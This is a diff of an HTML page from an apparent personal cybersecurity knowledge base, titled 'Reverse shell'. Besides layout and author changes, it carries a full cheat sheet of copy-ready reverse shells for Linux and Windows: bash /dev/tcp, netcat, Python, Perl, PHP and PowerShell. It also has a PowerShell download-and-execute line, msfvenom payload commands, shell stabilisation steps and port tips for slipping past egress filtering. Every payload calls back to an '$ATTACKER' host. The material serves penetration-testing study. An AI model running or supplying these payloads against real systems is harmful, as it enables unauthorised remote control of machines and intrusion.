@@ -3,11 +3,11 @@
 "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
 <head>
-<!-- 2026-07-20 Mon 15:55 -->
+<!-- 2026-07-30 Thu 22:13 -->
 <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>Reverse shell</title>
-<meta name="author" content="termux" />
+<meta name="author" content="Gregory Hugaerts" />
 <meta name="generator" content="Org Mode" />
 <link rel="stylesheet" href="style.css" type="text/css"/>
 <style type='text/css'>
@@ -860,6 +860,24 @@ pre {
 </head>
 <body>
 <div id="preamble" class="status">
+<div id='generated-header' class='generated'><header>
+ <nav>
+<a class='nav-title'href='/index.html' >
+Gregory Hugaerts
+</a>
+<input id='nav-toggle-top' class='nav-toggle' type='checkbox'>
+<label class='nav-button' for='nav-toggle-top'><span/></label>
+<div class='separator menu-sep'></div>
+<ul class='nav-list'>
+<li class='nav-item'>
+<a class='nav-link' href='/index.html'>
+Knowledge Base</a>
+</li>
+</ul>
+<div class='separator'></div>
+</nav>
+</header>
+</div>
 <div id='view-controls'><div id='toggle-mode' title='Mode'>&#9788;</div><div id='goto-top' title='Top'>&#8963;</div><div id='toggle-toc' title='Contents'>&#9776;</div></div>
 </div>
 <div id="content" class="content">
@@ -868,19 +886,19 @@ pre {
 <h2>Table of Contents</h2>
 <div id="text-table-of-contents" role="doc-toc">
 <ul>
-<li><a href="#org582ce1a">1. Listener — Always Start First</a></li>
-<li><a href="#orgb978808">2. Linux Payloads</a></li>
-<li><a href="#org159e50d">3. Windows Payloads</a></li>
-<li><a href="#orgdd0dd7a">4. Msfvenom Payloads</a></li>
-<li><a href="#orgd93d94f">5. Shell Stabilisation</a>
+<li><a href="#org464d200">1. Listener — Always Start First</a></li>
+<li><a href="#orgf7e053e">2. Linux Payloads</a></li>
+<li><a href="#orgf04e8fc">3. Windows Payloads</a></li>
+<li><a href="#org1f22fed">4. Msfvenom Payloads</a></li>
+<li><a href="#orgbfd1567">5. Shell Stabilisation</a>
 <ul>
-<li><a href="#org81ade93">Python PTY (Linux — most common)</a></li>
-<li><a href="#orga70a48f">rlwrap (before connecting)</a></li>
-<li><a href="#org92decfc">socat (full TTY — best result)</a></li>
+<li><a href="#orgee4dab7">Python PTY (Linux — most common)</a></li>
+<li><a href="#org6bbcb8d">rlwrap (before connecting)</a></li>
+<li><a href="#org94a5af6">socat (full TTY — best result)</a></li>
 </ul>
 </li>
-<li><a href="#org8852da0">6. Common Ports to Use</a></li>
-<li><a href="#org5c4eb6e">Tips</a></li>
+<li><a href="#org9d1e120">6. Common Ports to Use</a></li>
+<li><a href="#org3ff82b5">Tips</a></li>
 </ul>
 </div>
 </div>
@@ -899,15 +917,15 @@ Related: <a href="20260314T005725--webshell__concept_cybersecurity.html">Webshel
          <a href="20260314T005740--pivoting__concept_cybersecurity.html">Pivoting</a>
          <a href="20260214T085940--post-exploitation__concept_cybersecurity.html">Post Exploitation</a>
 </p>
-<div id="outline-container-org582ce1a" class="outline-2">
-<h2 id="org582ce1a">1. Listener — Always Start First</h2>
-<div class="outline-text-2" id="text-org582ce1a">
+<div id="outline-container-org464d200" class="outline-2">
+<h2 id="org464d200">1. Listener — Always Start First</h2>
+<div class="outline-text-2" id="text-org464d200">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_0b9e1cdba464455ab1f6054964ae177c>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_2c130f5469a04d4790b3d6976aaf8615>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_0b9e1cdba464455ab1f6054964ae177c=document.querySelector('button[name=btn_0b9e1cdba464455ab1f6054964ae177c]');
-copyBtnbtn_0b9e1cdba464455ab1f6054964ae177c.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Basic netcat listener\nnc -lvnp 4444\n\n# rlwrap for arrow keys and history (recommended)\nrlwrap nc -lvnp 4444\n`);copyBtnbtn_0b9e1cdba464455ab1f6054964ae177c.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_0b9e1cdba464455ab1f6054964ae177c.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_2c130f5469a04d4790b3d6976aaf8615=document.querySelector('button[name=btn_2c130f5469a04d4790b3d6976aaf8615]');
+copyBtnbtn_2c130f5469a04d4790b3d6976aaf8615.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Basic netcat listener\nnc -lvnp 4444\n\n# rlwrap for arrow keys and history (recommended)\nrlwrap nc -lvnp 4444\n`);copyBtnbtn_2c130f5469a04d4790b3d6976aaf8615.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_2c130f5469a04d4790b3d6976aaf8615.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -920,15 +938,15 @@ let res = copyTextToClipboard(`# Basic netcat listener\nnc -lvnp 4444\n\n# rlwra
 </div></div>
 </div>
 </div>
-<div id="outline-container-orgb978808" class="outline-2">
-<h2 id="orgb978808">2. Linux Payloads</h2>
-<div class="outline-text-2" id="text-orgb978808">
+<div id="outline-container-orgf7e053e" class="outline-2">
+<h2 id="orgf7e053e">2. Linux Payloads</h2>
+<div class="outline-text-2" id="text-orgf7e053e">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_16fd917fa5fd48b8a9acfcc2085af2eb>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_76411bd4e5a644898c2694b1486e6c05>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_16fd917fa5fd48b8a9acfcc2085af2eb=document.querySelector('button[name=btn_16fd917fa5fd48b8a9acfcc2085af2eb]');
-copyBtnbtn_16fd917fa5fd48b8a9acfcc2085af2eb.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Bash TCP — most reliable on Linux\nbash -i >& /dev/tcp/$ATTACKER/4444 0>&1\n\n# URL-encoded (for webshell delivery via curl)\nbash+-c+'bash+-i+>%26+/dev/tcp/$ATTACKER/4444+0>%261'\n\n# Bash alternative if >& is filtered\nbash -i > /dev/tcp/$ATTACKER/4444 0<&1 2>&1\n\n# Netcat with -e (if available)\nnc -e /bin/bash $ATTACKER 4444\n\n# Netcat without -e (BusyBox / stripped nc)\nrm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc $ATTACKER 4444 > /tmp/f\n\n# Python 3\npython3 -c 'import socket,subprocess,os;\ns=socket.socket();s.connect((\"$ATTACKER\",4444));\nos.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);\nsubprocess.call([\"/bin/bash\",\"-i\"])'\n\n# Python 2\npython -c 'import socket,subprocess,os;\ns=socket.socket();s.connect((\"$ATTACKER\",4444));\nos.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);\nsubprocess.call([\"/bin/sh\",\"-i\"])'\n\n# Perl\nperl -e 'use Socket;$i=\"$ATTACKER\";$p=4444;\nsocket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));\nconnect(S,sockaddr_in($p,inet_aton($i)));\nopen(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");\nexec(\"/bin/bash -i\");'\n\n# PHP (useful directly in webshell context)\nphp -r '$sock=fsockopen(\"$ATTACKER\",4444);\nexec(\"/bin/bash -i <&3 >&3 2>&3\");'\n`);copyBtnbtn_16fd917fa5fd48b8a9acfcc2085af2eb.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_16fd917fa5fd48b8a9acfcc2085af2eb.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_76411bd4e5a644898c2694b1486e6c05=document.querySelector('button[name=btn_76411bd4e5a644898c2694b1486e6c05]');
+copyBtnbtn_76411bd4e5a644898c2694b1486e6c05.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Bash TCP — most reliable on Linux\nbash -i >& /dev/tcp/$ATTACKER/4444 0>&1\n\n# URL-encoded (for webshell delivery via curl)\nbash+-c+'bash+-i+>%26+/dev/tcp/$ATTACKER/4444+0>%261'\n\n# Bash alternative if >& is filtered\nbash -i > /dev/tcp/$ATTACKER/4444 0<&1 2>&1\n\n# Netcat with -e (if available)\nnc -e /bin/bash $ATTACKER 4444\n\n# Netcat without -e (BusyBox / stripped nc)\nrm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc $ATTACKER 4444 > /tmp/f\n\n# Python 3\npython3 -c 'import socket,subprocess,os;\ns=socket.socket();s.connect((\"$ATTACKER\",4444));\nos.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);\nsubprocess.call([\"/bin/bash\",\"-i\"])'\n\n# Python 2\npython -c 'import socket,subprocess,os;\ns=socket.socket();s.connect((\"$ATTACKER\",4444));\nos.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);\nsubprocess.call([\"/bin/sh\",\"-i\"])'\n\n# Perl\nperl -e 'use Socket;$i=\"$ATTACKER\";$p=4444;\nsocket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));\nconnect(S,sockaddr_in($p,inet_aton($i)));\nopen(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");\nexec(\"/bin/bash -i\");'\n\n# PHP (useful directly in webshell context)\nphp -r '$sock=fsockopen(\"$ATTACKER\",4444);\nexec(\"/bin/bash -i <&3 >&3 2>&3\");'\n`);copyBtnbtn_76411bd4e5a644898c2694b1486e6c05.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_76411bd4e5a644898c2694b1486e6c05.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -973,15 +991,15 @@ exec("/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span>
 </div></div>
 </div>
 </div>
-<div id="outline-container-org159e50d" class="outline-2">
-<h2 id="org159e50d">3. Windows Payloads</h2>
-<div class="outline-text-2" id="text-org159e50d">
+<div id="outline-container-orgf04e8fc" class="outline-2">
+<h2 id="orgf04e8fc">3. Windows Payloads</h2>
+<div class="outline-text-2" id="text-orgf04e8fc">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_6c690b5fc22f4d6daf656b71e8503c07>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_788ec3c1f8604451af5dc06dd262e02a>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_6c690b5fc22f4d6daf656b71e8503c07=document.querySelector('button[name=btn_6c690b5fc22f4d6daf656b71e8503c07]');
-copyBtnbtn_6c690b5fc22f4d6daf656b71e8503c07.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# PowerShell — most reliable on modern Windows\npowershell -NoP -NonI -W Hidden -Exec Bypass -c \\\n  \"$client = New-Object System.Net.Sockets.TCPClient('$ATTACKER',4444);\n  $stream = $client.GetStream();\n  [byte[]]$bytes = 0..65535|%{0};\n  while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){\n    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);\n    $sendback = (iex $data 2>&1 | Out-String);\n    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';\n    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);\n    $stream.Write($sendbyte,0,$sendbyte.Length);\n    $stream.Flush()};$client.Close()\"\n\n# PowerShell one-liner — download and execute hosted script\npowershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://$ATTACKER/rev.ps1')\"\n\n# Invoke-PowerShellTcp.ps1 (Nishang) — host and call\n# Add to end of file: Invoke-PowerShellTcp -Reverse -IPAddress $ATTACKER -Port 4444\n\n# Netcat for Windows\n.\\nc.exe -e cmd.exe $ATTACKER 4444\n`);copyBtnbtn_6c690b5fc22f4d6daf656b71e8503c07.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_6c690b5fc22f4d6daf656b71e8503c07.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_788ec3c1f8604451af5dc06dd262e02a=document.querySelector('button[name=btn_788ec3c1f8604451af5dc06dd262e02a]');
+copyBtnbtn_788ec3c1f8604451af5dc06dd262e02a.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# PowerShell — most reliable on modern Windows\npowershell -NoP -NonI -W Hidden -Exec Bypass -c \\\n  \"$client = New-Object System.Net.Sockets.TCPClient('$ATTACKER',4444);\n  $stream = $client.GetStream();\n  [byte[]]$bytes = 0..65535|%{0};\n  while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){\n    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);\n    $sendback = (iex $data 2>&1 | Out-String);\n    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';\n    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);\n    $stream.Write($sendbyte,0,$sendbyte.Length);\n    $stream.Flush()};$client.Close()\"\n\n# PowerShell one-liner — download and execute hosted script\npowershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://$ATTACKER/rev.ps1')\"\n\n# Invoke-PowerShellTcp.ps1 (Nishang) — host and call\n# Add to end of file: Invoke-PowerShellTcp -Reverse -IPAddress $ATTACKER -Port 4444\n\n# Netcat for Windows\n.\\nc.exe -e cmd.exe $ATTACKER 4444\n`);copyBtnbtn_788ec3c1f8604451af5dc06dd262e02a.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_788ec3c1f8604451af5dc06dd262e02a.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1010,15 +1028,15 @@ let res = copyTextToClipboard(`# PowerShell — most reliable on modern Windows\
 </div></div>
 </div>
 </div>
-<div id="outline-container-orgdd0dd7a" class="outline-2">
-<h2 id="orgdd0dd7a">4. Msfvenom Payloads</h2>
-<div class="outline-text-2" id="text-orgdd0dd7a">
+<div id="outline-container-org1f22fed" class="outline-2">
+<h2 id="org1f22fed">4. Msfvenom Payloads</h2>
+<div class="outline-text-2" id="text-org1f22fed">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_d4353a3c2eec467f96218501ecf9e18d>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_344b867caac24f02be4b40a3536295b7>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_d4353a3c2eec467f96218501ecf9e18d=document.querySelector('button[name=btn_d4353a3c2eec467f96218501ecf9e18d]');
-copyBtnbtn_d4353a3c2eec467f96218501ecf9e18d.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Linux ELF\nmsfvenom -p linux/x64/shell_reverse_tcp LHOST=$ATTACKER LPORT=4444 -f elf -o shell.elf\n\n# Windows EXE\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=$ATTACKER LPORT=4444 -f exe -o shell.exe\n\n# Windows Meterpreter\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$ATTACKER LPORT=4444 -f exe -o meter.exe\n\n# ASPX (IIS)\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=$ATTACKER LPORT=4444 -f aspx -o shell.aspx\n\n# PHP\nmsfvenom -p php/reverse_php LHOST=$ATTACKER LPORT=4444 -f raw -o shell.php\n\n# WAR (Tomcat)\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=$ATTACKER LPORT=4444 -f war -o shell.war\n`);copyBtnbtn_d4353a3c2eec467f96218501ecf9e18d.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_d4353a3c2eec467f96218501ecf9e18d.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_344b867caac24f02be4b40a3536295b7=document.querySelector('button[name=btn_344b867caac24f02be4b40a3536295b7]');
+copyBtnbtn_344b867caac24f02be4b40a3536295b7.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Linux ELF\nmsfvenom -p linux/x64/shell_reverse_tcp LHOST=$ATTACKER LPORT=4444 -f elf -o shell.elf\n\n# Windows EXE\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=$ATTACKER LPORT=4444 -f exe -o shell.exe\n\n# Windows Meterpreter\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$ATTACKER LPORT=4444 -f exe -o meter.exe\n\n# ASPX (IIS)\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=$ATTACKER LPORT=4444 -f aspx -o shell.aspx\n\n# PHP\nmsfvenom -p php/reverse_php LHOST=$ATTACKER LPORT=4444 -f raw -o shell.php\n\n# WAR (Tomcat)\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=$ATTACKER LPORT=4444 -f war -o shell.war\n`);copyBtnbtn_344b867caac24f02be4b40a3536295b7.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_344b867caac24f02be4b40a3536295b7.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1043,23 +1061,23 @@ let res = copyTextToClipboard(`# Linux ELF\nmsfvenom -p linux/x64/shell_reverse_
 </div></div>
 </div>
 </div>
-<div id="outline-container-orgd93d94f" class="outline-2">
-<h2 id="orgd93d94f">5. Shell Stabilisation</h2>
-<div class="outline-text-2" id="text-orgd93d94f">
+<div id="outline-container-orgbfd1567" class="outline-2">
+<h2 id="orgbfd1567">5. Shell Stabilisation</h2>
+<div class="outline-text-2" id="text-orgbfd1567">
 <p>
 Raw reverse shells have no tab completion, no arrow keys, and
 <code>Ctrl+C</code> kills the connection. Stabilise immediately.
 </p>
 </div>
-<div id="outline-container-org81ade93" class="outline-3">
-<h3 id="org81ade93">Python PTY (Linux — most common)</h3>
-<div class="outline-text-3" id="text-org81ade93">
+<div id="outline-container-orgee4dab7" class="outline-3">
+<h3 id="orgee4dab7">Python PTY (Linux — most common)</h3>
+<div class="outline-text-3" id="text-orgee4dab7">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_3117a5d260f147ce856dc57e9e9c1611>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_3e318ac69cb7436885ed4d3822a14847>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_3117a5d260f147ce856dc57e9e9c1611=document.querySelector('button[name=btn_3117a5d260f147ce856dc57e9e9c1611]');
-copyBtnbtn_3117a5d260f147ce856dc57e9e9c1611.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# On target\npython3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n# Ctrl+Z to background\nstty raw -echo; fg\n# Press Enter twice\nexport TERM=xterm\n`);copyBtnbtn_3117a5d260f147ce856dc57e9e9c1611.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_3117a5d260f147ce856dc57e9e9c1611.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_3e318ac69cb7436885ed4d3822a14847=document.querySelector('button[name=btn_3e318ac69cb7436885ed4d3822a14847]');
+copyBtnbtn_3e318ac69cb7436885ed4d3822a14847.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# On target\npython3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n# Ctrl+Z to background\nstty raw -echo; fg\n# Press Enter twice\nexport TERM=xterm\n`);copyBtnbtn_3e318ac69cb7436885ed4d3822a14847.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_3e318ac69cb7436885ed4d3822a14847.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1073,15 +1091,15 @@ let res = copyTextToClipboard(`# On target\npython3 -c 'import pty; pty.spawn(\"
 </div></div>
 </div>
 </div>
-<div id="outline-container-orga70a48f" class="outline-3">
-<h3 id="orga70a48f">rlwrap (before connecting)</h3>
-<div class="outline-text-3" id="text-orga70a48f">
+<div id="outline-container-org6bbcb8d" class="outline-3">
+<h3 id="org6bbcb8d">rlwrap (before connecting)</h3>
+<div class="outline-text-3" id="text-org6bbcb8d">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_71a603b9a2c5465596c1fabb8d55bc65>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_3bd4f51012e44abaa62dc96b5d0536cf>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_71a603b9a2c5465596c1fabb8d55bc65=document.querySelector('button[name=btn_71a603b9a2c5465596c1fabb8d55bc65]');
-copyBtnbtn_71a603b9a2c5465596c1fabb8d55bc65.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`rlwrap nc -lvnp 4444\n# Provides readline — arrows and history work without further steps\n`);copyBtnbtn_71a603b9a2c5465596c1fabb8d55bc65.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_71a603b9a2c5465596c1fabb8d55bc65.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_3bd4f51012e44abaa62dc96b5d0536cf=document.querySelector('button[name=btn_3bd4f51012e44abaa62dc96b5d0536cf]');
+copyBtnbtn_3bd4f51012e44abaa62dc96b5d0536cf.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`rlwrap nc -lvnp 4444\n# Provides readline — arrows and history work without further steps\n`);copyBtnbtn_3bd4f51012e44abaa62dc96b5d0536cf.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_3bd4f51012e44abaa62dc96b5d0536cf.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1091,15 +1109,15 @@ let res = copyTextToClipboard(`rlwrap nc -lvnp 4444\n# Provides readline — arr
 </div></div>
 </div>
 </div>
-<div id="outline-container-org92decfc" class="outline-3">
-<h3 id="org92decfc">socat (full TTY — best result)</h3>
-<div class="outline-text-3" id="text-org92decfc">
+<div id="outline-container-org94a5af6" class="outline-3">
+<h3 id="org94a5af6">socat (full TTY — best result)</h3>
+<div class="outline-text-3" id="text-org94a5af6">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_f4c6fe757de64da88e884250bdf9e68d>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_f1b64c40a11b419da19374a1c7b11525>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_f4c6fe757de64da88e884250bdf9e68d=document.querySelector('button[name=btn_f4c6fe757de64da88e884250bdf9e68d]');
-copyBtnbtn_f4c6fe757de64da88e884250bdf9e68d.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Attacker — listen\nsocat file:\`tty\`,raw,echo=0 tcp-listen:4444\n\n# Target — connect\nsocat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$ATTACKER:4444\n`);copyBtnbtn_f4c6fe757de64da88e884250bdf9e68d.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_f4c6fe757de64da88e884250bdf9e68d.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_f1b64c40a11b419da19374a1c7b11525=document.querySelector('button[name=btn_f1b64c40a11b419da19374a1c7b11525]');
+copyBtnbtn_f1b64c40a11b419da19374a1c7b11525.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Attacker — listen\nsocat file:\`tty\`,raw,echo=0 tcp-listen:4444\n\n# Target — connect\nsocat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$ATTACKER:4444\n`);copyBtnbtn_f1b64c40a11b419da19374a1c7b11525.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_f1b64c40a11b419da19374a1c7b11525.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1113,9 +1131,9 @@ let res = copyTextToClipboard(`# Attacker — listen\nsocat file:\`tty\`,raw,ech
 </div>
 </div>
 </div>
-<div id="outline-container-org8852da0" class="outline-2">
-<h2 id="org8852da0">6. Common Ports to Use</h2>
-<div class="outline-text-2" id="text-org8852da0">
+<div id="outline-container-org9d1e120" class="outline-2">
+<h2 id="org9d1e120">6. Common Ports to Use</h2>
+<div class="outline-text-2" id="text-org9d1e120">
 <p>
 Choose based on what egress is likely permitted:
 </p>
@@ -1163,9 +1181,9 @@ Choose based on what egress is likely permitted:
 </table>
 </div>
 </div>
-<div id="outline-container-org5c4eb6e" class="outline-2">
-<h2 id="org5c4eb6e">Tips</h2>
-<div class="outline-text-2" id="text-org5c4eb6e">
+<div id="outline-container-org3ff82b5" class="outline-2">
+<h2 id="org3ff82b5">Tips</h2>
+<div class="outline-text-2" id="text-org3ff82b5">
 <ul class="org-ul">
 <li>Always start the listener before triggering the payload</li>
 <li>Use port 443 or 80 on restricted networks — outbound filtering
@@ -1184,6 +1202,20 @@ IP and port pre-filled — faster than typing from memory</li>
 </div>
 </div>
 <div id="postamble" class="status">
+<div id='generated-footer' class='generated'><footer>
+ <nav>
+<div class='separator'></div>
+<a class='nav-author'href='https://gregoryhugaerts.github.io' >
+gregoryhugaerts.github.io
+</a>
+<input id='nav-toggle-bot' class='nav-toggle' type='checkbox'>
+<label class='nav-button' for='nav-toggle-bot'><span/></label>
+<div class='separator menu-sep'></div>
+<ul class='nav-list'>
+</ul>
+</nav>
+</footer>
+</div>
 <script type="text/javascript">
 <!--/*--><![CDATA[/*><!--*/
 if (!document.cookie.split('; ').find(r => r.startsWith('mode'))) {
@@ -1191,6 +1223,7 @@ document.cookie = 'mode=dark'
 }
 document.cookie = 'light=modus-operandi-tinted'
 document.cookie = 'dark=modus-vivendi-tinted'
+document.cookie = 'options=collapsing:t__src-lang:t';
 /*
 ;; nice-org-html.js
 ;;==============================================================================
